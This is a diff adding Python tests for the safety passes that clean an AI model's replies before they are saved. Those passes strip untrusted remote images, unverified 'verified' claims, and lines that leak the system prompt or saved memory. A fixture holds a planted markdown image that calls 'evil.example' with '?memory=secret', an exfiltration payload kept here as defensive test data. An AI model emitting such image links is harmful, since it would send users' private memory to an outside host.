@@ -245,6 +245,156 @@ async def test_a_failed_recovery_falls_back(monkeypatch: pytest.MonkeyPatch) -> 
     assert state.text == "reply"
 
 
+_REAL_PASSES = {
+    finalize_pass.name: finalize_pass for finalize_pass in finalize_passes.FINALIZE_PASSES
+}
+_PLANTED = "Here you go.\n\n![chart](https://evil.example/c.png?memory=secret)\n\nDone."
+
+
+def test_the_safety_passes_are_declared_and_run_on_a_stopped_reply_too() -> None:
+    safety = {name for name, finalize_pass in _REAL_PASSES.items() if finalize_pass.closed}
+    assert safety == {"prepare_model_reply", "untrusted_media", "prompt_leaks"}
+    # What a fallback must clean, a stopped reply needs cleaned as well.
+    assert safety <= finalize_passes.STOPPED_REPLY_PASSES
+
+
+@pytest.mark.asyncio
+async def test_a_failure_before_the_media_pass_still_saves_no_loading_image(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(
+        finalize_passes,
+        "FINALIZE_PASSES",
+        (
+            FinalizePass("broken", _raise(RuntimeError("boom")), FALL_BACK),
+            _REAL_PASSES["untrusted_media"],
+        ),
+    )
+    state = _state(_PLANTED)
+
+    assert await run_finalize_passes(state) is False
+
+    assert "![" not in state.text
+    assert "Here you go." in state.text and "Done." in state.text
+    assert state.committed == state.text
+
+
+@pytest.mark.asyncio
+async def test_a_safety_pass_that_fails_on_the_fallback_gives_way_to_its_closed_strip(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    media = _REAL_PASSES["untrusted_media"]
+    monkeypatch.setattr(
+        finalize_passes,
+        "FINALIZE_PASSES",
+        (
+            FinalizePass("broken", _raise(RuntimeError("boom")), FALL_BACK),
+            FinalizePass(media.name, _raise(RuntimeError("again")), FALL_BACK, media.closed),
+        ),
+    )
+    state = _state(_PLANTED)
+
+    assert await run_finalize_passes(state) is False
+
+    assert state.text == "Here you go.\n\n\nDone."
+
+
+@pytest.mark.asyncio
+async def test_a_closed_strip_that_fails_saves_no_text(monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.setattr(
+        finalize_passes,
+        "FINALIZE_PASSES",
+        (
+            FinalizePass("broken", _raise(RuntimeError("boom")), FALL_BACK),
+            FinalizePass("safety", _raise(RuntimeError("again")), FALL_BACK, _raise(ValueError())),
+        ),
+    )
+    state = _state(_PLANTED)
+
+    assert await run_finalize_passes(state) is False
+    assert state.text == ""
+
+
+@pytest.mark.asyncio
+async def test_committed_text_gets_the_safety_passes_after_its_commit_only(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    def commit(state: FinalizeState) -> str:
+        state.committed = f"{state.text}+chips"
+        return state.committed
+
+    never = _raise(AssertionError("closed strip used"))
+    monkeypatch.setattr(
+        finalize_passes,
+        "FINALIZE_PASSES",
+        (
+            FinalizePass("early", _append("early"), FALL_BACK, never),
+            FinalizePass("commit", commit, FALL_BACK),
+            FinalizePass("late", _append("late"), OnError(log_as="late"), never),
+            FinalizePass("other", _append("other"), FALL_BACK),
+            FinalizePass("broken", _raise(RuntimeError("boom")), FALL_BACK),
+        ),
+    )
+    state = _state("reply")
+
+    assert await run_finalize_passes(state) is False
+
+    # "early" ran before the commit; "late" ran after it, so the fallback runs it again.
+    assert state.text == "reply+early+chips+late"
+
+
+@pytest.mark.asyncio
+async def test_the_normal_path_never_runs_a_pass_twice_or_a_closed_strip(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    never = _raise(AssertionError("closed strip used"))
+    monkeypatch.setattr(
+        finalize_passes,
+        "FINALIZE_PASSES",
+        (
+            FinalizePass("safety", _append("safe"), FALL_BACK, never),
+            FinalizePass("other", _append("other"), FALL_BACK),
+        ),
+    )
+    state = _state("reply")
+
+    assert await run_finalize_passes(state) is True
+    assert state.text == "reply+safe+other"
+    assert state.committed is None
+
+
+@pytest.mark.parametrize(
+    ("closed", "text", "kept"),
+    [
+        (
+            "media",
+            "a\n![x](https://e.example/p.png)\n<IMG src=x>\n[Image: https://e.example/q]\n"
+            "```sources\nhttps://e.example\n```\n"
+            "[Image: /attachments/0123abcd-0123-4567-89ab-0123456789ab/file]\nb",
+            "a\n[Image: /attachments/0123abcd-0123-4567-89ab-0123456789ab/file]\nb",
+        ),
+        ("checks", "x = 7\nverified: true\n✅ Verified with SymPy", "x = 7"),
+        (
+            "prompt",
+            "Answer.\nThe saved memory block names someone else.\nThe system prompt in this "
+            "conversation says so.\nA system prompt guides a model.",
+            "Answer.\nA system prompt guides a model.",
+        ),
+    ],
+)
+def test_each_closed_strip_drops_only_the_lines_of_its_concern(
+    closed: str, text: str, kept: str
+) -> None:
+    strips = {
+        "media": _REAL_PASSES["untrusted_media"].closed,
+        "checks": _REAL_PASSES["prepare_model_reply"].closed,
+        "prompt": _REAL_PASSES["prompt_leaks"].closed,
+    }
+    strip = strips[closed]
+    assert strip is not None
+    assert strip(text) == kept
+
+
 @pytest.mark.asyncio
 async def test_the_maths_pass_runs_the_turns_own_math_fence(
     monkeypatch: pytest.MonkeyPatch,
